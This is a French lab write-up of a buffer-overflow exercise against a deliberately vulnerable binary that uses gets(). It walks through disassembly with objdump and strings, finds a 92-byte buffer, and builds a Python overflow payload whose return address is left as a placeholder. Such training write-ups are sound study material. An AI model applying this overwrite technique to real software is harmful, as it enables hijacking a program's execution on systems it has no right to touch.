# Exercice 3 - Exploitation d'un Débordement de Tampon

## Objectif
Le but de cet exercice était d'exploiter une vulnérabilité de débordement de tampon pour modifier le flux d'exécution du programme et afficher le message "code flow successfully changed".

## Analyse
1. Le binaire était vulnérable à une attaque par débordement de tampon en raison de l'utilisation de la fonction non sécurisée `gets()`.
2. En désassemblant le binaire, nous avons découvert que le programme vérifie une valeur sur la pile et l'appelle comme une fonction si elle est non nulle.

## Processus d'Exploitation

1. **Désassembler le binaire :**
   ```
   objdump -d ./bin > desassemble.txt
   ```

2. **Analyser la fonction principale :**
   ```
   grep -A 30 '<main>:' desassemble.txt
   ```
   Cela a révélé la disposition de la pile et l'appel vulnérable à `gets()`.

3. **Trouver le message de succès :**
   ```
   strings ./bin | grep "flow"
   ```
   Cela a confirmé la présence du message "code flow successfully changed".

4. **Déterminer la taille du tampon :**
   À partir du désassemblage, nous avons déduit que la taille du tampon était de 92 octets.

5. **Élaborer l'exploit :**
   Nous avons créé une commande Python pour générer notre charge utile :
   ```
   python -c "print 'A'*92 + '\xXX\xXX\xXX\xXX'"
   ```
   Où `\xXX\xXX\xXX\xXX` est l'adresse de la fonction qui affiche le message de succès.

6. **Trouver l'adresse de la fonction cible :**
   Nous avons utilisé objdump pour trouver l'adresse de la fonction qui affiche le message de succès :
   ```
   objdump -d ./bin | grep -B 5 -A 5 "flow"
   ```

## Leçons Apprises
1. Les dangers de l'utilisation de fonctions non sécurisées comme `gets()`.
2. L'importance d'une validation appropriée des entrées et de la vérification de la taille des tampons.
3. Comment la disposition de la pile peut être exploitée dans les attaques par débordement de tampon.
4. L'utilité des outils comme `objdump` et `strings` dans l'analyse binaire.

## Considérations Éthiques
Cet exercice est uniquement à des fins éducatives. Obtenez toujours une autorisation explicite avant de tenter d'exploiter des vulnérabilités sur un système que vous ne possédez pas.